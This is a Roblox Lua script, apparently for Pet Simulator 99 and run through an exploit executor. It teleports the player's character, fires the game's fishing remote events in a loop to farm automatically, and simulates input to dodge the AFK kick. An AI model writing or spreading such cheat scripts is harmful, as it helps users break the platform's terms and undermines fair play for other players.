getgenv().fishing = true
getgenv().AutoUnlockMap = false

task.wait(15)


function DataGame_99()
    DataGame99 = require(game:GetService("ReplicatedStorage"):WaitForChild("Library", 10):WaitForChild("Client", 10))
end

if pcall(DataGame_99) then
    print('Loaded maps..')
else
    print("Fail..")
end

teleport_fish = true
task.spawn(function()
    while task.wait() do
        if getgenv().fishing then
            if teleport_fish then
                enterFish = game:GetService("Workspace").__THINGS.Instances.AdvancedFishing.Teleports.Enter.CFrame
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = enterFish
                task.wait(5)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1451.46741, 66.0671844,
                    -4447.83643, 0.265185595, 3.25603811e-09, -0.964197397, -9.78775319e-08, 1, -2.35425581e-08,
                    0.964197397, 1.00616404e-07, 0.265185595)
                task.wait(5)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1451.46741, 66.0671844,
                    -4447.83643, 0.265185595, 3.25603811e-09, -0.964197397, -9.78775319e-08, 1, -2.35425581e-08,
                    0.964197397, 1.00616404e-07, 0.265185595)
                teleport_fish = false
                task.wait(15)
            end
            local args = {
                [1] = "AdvancedFishing",
                [2] = "RequestCast",
                [3] = Vector3.new(1482.6259765625, 61.624961853027344, -4468.38720703125)
            }
            game:GetService("ReplicatedStorage").Network.Instancing_FireCustomFromClient:FireServer(unpack(args))
            task.wait(3.6)
            local args = {
                [1] = "AdvancedFishing",
                [2] = "RequestReel"
            }
            game:GetService("ReplicatedStorage").Network.Instancing_FireCustomFromClient:FireServer(unpack(args))

            while game:GetService("Workspace")["__DEBRIS"]:FindFirstChild('FishingLineAnchor') do
                if not game:GetService("Workspace")["__DEBRIS"]:FindFirstChild('FishingLineAnchor') then break end
                local args = {
                    [1] = "AdvancedFishing",
                    [2] = "Clicked"
                }
                game:GetService("ReplicatedStorage").Network.Instancing_InvokeCustomFromClient:InvokeServer(unpack(args))
            end
        end
        task.wait()
    end
end)

--#region กัน afk
local function antiAFK()
    task.spawn(function()
        warn('ANTI AFK loaded..!!')
        while task.wait(300) do
            pcall(function()
                local vu = game:GetService("VirtualUser")
                game:GetService("Players").LocalPlayer.Idled:connect(function()
                    local randomPosition = Vector2.new(math.random(), math.random())
                    vu:Button2Down(randomPosition, workspace.CurrentCamera.CFrame)
                    wait(1)
                    vu:Button2Up(randomPosition, workspace.CurrentCamera.CFrame)
                    workspace.CurrentCamera.CFrame = workspace.CurrentCamera.CFrame * CFrame.Angles(0, math.rad(10), 0)
                end)
            end)
        end
    end)
end
antiAFK()
--#endregion

